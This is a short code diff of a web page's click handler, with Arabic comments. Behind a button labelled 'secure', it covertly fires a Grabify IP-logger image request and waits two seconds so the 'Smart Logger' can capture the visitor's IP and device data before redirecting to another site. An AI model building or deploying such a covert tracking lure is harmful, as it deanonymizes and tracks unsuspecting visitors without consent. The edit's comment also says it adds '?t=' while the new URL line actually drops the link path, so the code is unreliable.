@@ -15,18 +15,18 @@
       const btn = document.getElementById('secureBtn');
       
       btn.addEventListener('click', function() {
-        // طابع زمني لكسر الكاش وتخطي حظر التكرار في المتصفح والسيرفر
+        // طابع زمني فريد لمنع المتصفح والسيرفر من قراءة الكاش القديم
         const timestamp = Date.now();
         
-        // الرابط الجديد تماماً بناءً على صورتك مع متغير كسر الكاش
-        const grabifyUrl = 'https://grabify.link/OAM0DU' + timestamp; 
+        // تم إصلاح الرابط هنا بإضافة ?t= لكسر الكاش دون تدمير كود الرابط الأصلي
+        const grabifyUrl = 'https://grabify.link' + timestamp; 
         const destinationUrl = 'https://dominoes.mx';
 
-        // استخدام كائن الصورة لإرسال بيانات الـ Smart Logger والـ IP بصمت تام وبأعلى صلاحية أمان
+        // استخدام كائن الصورة لإرسال بيانات الـ Smart Logger والـ IP بأعلى صلاحية أمان
         const imgTracker = new Image();
         imgTracker.src = grabifyUrl;
 
-        // مهلة ثانيتين كاملتين لضمان انتهاء السكربت من قراءة بيانات البيسي/الهاتف والبطارية قبل التحويل
+        // مهلة ثانيتين كاملتين لضمان معالجة السيرفر لبيانات الـ Smart Logger قبل التحويل
         setTimeout(function() {
           window.location.href = destinationUrl;
         }, 2000);
